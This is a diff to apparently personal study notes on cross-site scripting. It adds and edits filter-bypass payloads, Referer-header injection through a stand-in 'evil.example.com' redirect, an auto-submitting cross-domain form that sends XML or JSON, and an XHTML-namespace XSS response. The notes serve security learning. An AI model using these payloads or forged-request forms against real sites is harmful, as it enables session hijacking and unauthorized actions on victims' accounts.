@@ -264,7 +264,7 @@ In general this is useless nowadays but it's good to know that this exists
 	<img onerror='alert(1)'src=a>
 	<img onerror=`alert(1)`src=a>	
 	#Using backticks in the atributes we can disguide the event handler name
-	<img src=`a`onerror=alert(1)> ##This way the server will think that the event handler es called "aonerror" an not "onerror" but the browser will understand correctly
+	<img src='a'onerror=alert(1)> ##This way the server will think that the event handler es called "aonerror" an not "onerror" but the browser will understand correctly
 
 #####Mixing sustitute spaces + attribute delimiter
 	<img onerror="alert(1)"src=a>
@@ -341,6 +341,10 @@ Copy the next in the javascript console as example:
 #This echo "Hola Mundo!"
 String.fromCharCode(72, 111, 108, 97, 32, 77, 117, 110, 100, 111, 33)
 String.fromCharCode(72,111,108,97,32,113,117,101,32,116,97,108)##Hola que tal
+```
+To inject this you need to add it into script tags
+```
+<script>alert(String.fromCharCode(72,111,108,97,32,113,117,101,32,116,97,108))</script>
 ```
 
 How can we convert a text in ASCII character and revers with:
@@ -430,7 +434,7 @@ to hide the contents of scripts and potentially bypass some input filters:
 - Beating Sanitization
 	```
 	<script><script>alert(1)</script>
-	<scr<script>ipt>alert(1)</script>
+		
 	<scr<object>ipt>alert(1)</script>
 
 	#If you can control the value foo:
@@ -497,6 +501,90 @@ http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html
 - At the worst you could try to exploit another XSS attack in other webpage that makes a request to the page with a cookie (Our payload) that perform the attack.
 
 **Exploiting XSS in the Referer Header**
+Sometime the _Reference_ header is pasted iin the webpage, to exploit this you just need that a malicious web server redirect to the vulnerable page.
+- In case of the XSS were stored is easy jsut with Burp put the value you want
+- In case the XSS were reflected you need to force to your victim be redirect from your malicious web page:
+```
+http://evil.example.com/?<script>alert(123)>
+```
+That will redirect to `http://victim.example.org/vulnerable_xss_page.php`
+With the payload injected in the Referer header.
+
+- In case that the only referer accepted by the web page were itself domain what could we do? Try to exploit some redirection method in the web page but the success depend of the implementarion of this!
+
+**Exploiting XSS in Nonstandard Request and response Content**
+A good article about this:
+https://www.rapid7.com/blog/post/2022/05/04/xss-in-json-old-school-attacks-for-modern-applications/
+
+Even if you are adding a xss payload into a json format content this content may be later added to a Database and could inject this into some web with some .innerHTML instead of .innerTEXT.
+
+**Sending XML Requests Cross-Domain**
+We can send near-arbitraty data cross-domain withing HTTP request body with an HTML form, that with the _enctype_ we add to the header in the _Content-type_ _text/plain_ and make the browser handle the form parameters as:
+- Send each parameter on a separate line within the request
+- Use '=' to separate key and value (normal behaviour)
+- Do not perform any URL encoding of the parameters name o value.
+(Not all browser act like this but it's a more or less predictable behaviour in general).
+
+With this we can just use a HTML form to send XML information:
+To send:
+```xml
+<?xml version=”1.0”?><data><param>foo</param></data>
+```
+Just the next form:
+```html
+<form enctype=”text/plain” action=”http://wahh-app.com/ vuln.php”
+method=”POST”>
+<input type=”hidden” name='<?xml version'
+value=’”1.0”?><data><param>foo</param></data>’>
+</form><script>document.forms[0].submit();</script>
+```
+
+To include common attack characters within the value of the param parameter,
+such as tag angle brackets, these would need to be HTML-encoded within the
+XML request. Therefore, they would need to be double HTML-encoded within
+the HTML form that generates that request.
+
+With this technique we can make with a easy form send an XML, Json even some specifically serialized binary request.
+ You can use this technique to submit cross-domain requests containing
+virtually any type of content, such as JSON-encoded data and serialized binary
+objects, provided you can incorporate the equals character somewhere within
+the request. This is normally possible by modifying a free-form text field within
+the request that can contain an equals character. For example in the following
+JSON data, the comment field is used to introduce the required equals character:
+`{ “name”: “John”, “email”: “gomad@diet.com”, “comment”: “=” }`
+
+What are the problem?
+The request have in the header _Content-Type: text/plain_. In case that the app allow several content-types no problem, we can inject xml, json or serialized object, but in case that not we have nothing to do here.
+
+Searching for XSS:
+- [ ] First thing to do should be check in the behaviour remains changing the Content-Type to text/plain.
+
+
+**Executing JavaScript from Within XML Responses**
+The second challenge when you try inject XSS payload in nonstandard content is to find a way of manipulating the response so
+that it executes your script when consumed directly by the browser.
+To check:
+- If the response have some inacurrate _Content-Type_ header or none at all.
+- If the inputs are being reflected in the response.
+
+How can we inject XSS into XML response?
+In case that the browser were who interpret the XML information we can define an XML Markup to define a new namespace mapped to XHTML, for example the next response will be XSS in firefox
+```
+HTTP/1.1 200 Ok
+Content-Type: text/xml
+Content-Length: 1098
+<xml>
+<data>
+...
+<a xmlns:a='http://www.w3.org/1999/xhtml'>
+<a:body onload='alert(1)'/></a>
+...
+</data>
+</xml>
+```
+
+**Attacking Browser XSS Filters**
+
 
 
 ###### Some more resources
